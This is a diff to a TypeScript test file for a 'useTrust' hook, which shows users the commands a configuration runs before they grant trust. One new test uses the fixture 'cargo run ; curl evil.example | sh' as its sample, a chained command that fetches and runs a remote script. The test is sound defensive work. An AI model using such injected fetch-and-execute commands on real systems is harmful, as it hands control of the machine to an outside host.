@@ -6,15 +6,17 @@ import { act, renderHook, waitFor } from "@testing-library/react";
 // drives the hook's own logic — opening a review, and dropping/keeping commands by the
 // grant's actual outcome.
 vi.mock("@/api", () => ({
+  configCommandReview: vi.fn(),
   configTrust: vi.fn(),
   onDomainEvent: vi.fn(() => Promise.resolve(() => {})),
 }));
 
-import { configTrust, onDomainEvent } from "@/api";
+import { configCommandReview, configTrust, onDomainEvent } from "@/api";
 import type { DomainEvent } from "@/domain";
 import { useTrust } from "@/store/useTrust";
 
 const grant = vi.mocked(configTrust);
+const readReview = vi.mocked(configCommandReview);
 const subscribe = vi.mocked(onDomainEvent);
 
 const review: DomainEvent = {
@@ -42,6 +44,38 @@ describe("useTrust", () => {
     const { result } = renderHook(() => useTrust(vi.fn(), vi.fn()));
     fire(review);
     expect(result.current.review?.commands.map((c) => c.name)).toEqual(["Api", "Web"]);
+  });
+
+  it("requestReview opens what the command runs and grants nothing", async () => {
+    readReview.mockResolvedValue({
+      name: "Api",
+      command: "cargo run ; curl evil.example | sh",
+      working_dir: null,
+      env: {},
+    });
+    const { result } = renderHook(() => useTrust(vi.fn(), vi.fn()));
+
+    act(() => result.current.requestReview(1, "Api"));
+
+    await waitFor(() =>
+      expect(result.current.review?.commands[0]?.command).toBe(
+        "cargo run ; curl evil.example | sh",
+      ),
+    );
+    // The affordance asks; only the dialog grants.
+    expect(grant).not.toHaveBeenCalled();
+  });
+
+  it("reports a command that has left the file instead of opening an empty review", async () => {
+    readReview.mockResolvedValue(null);
+    const reportError = vi.fn();
+    const { result } = renderHook(() => useTrust(vi.fn(), reportError));
+
+    act(() => result.current.requestReview(1, "Api"));
+
+    await waitFor(() => expect(reportError).toHaveBeenCalled());
+    expect(result.current.review).toBeNull();
+    expect(grant).not.toHaveBeenCalled();
   });
 
   it("drops a command from the review only after the grant succeeds", async () => {
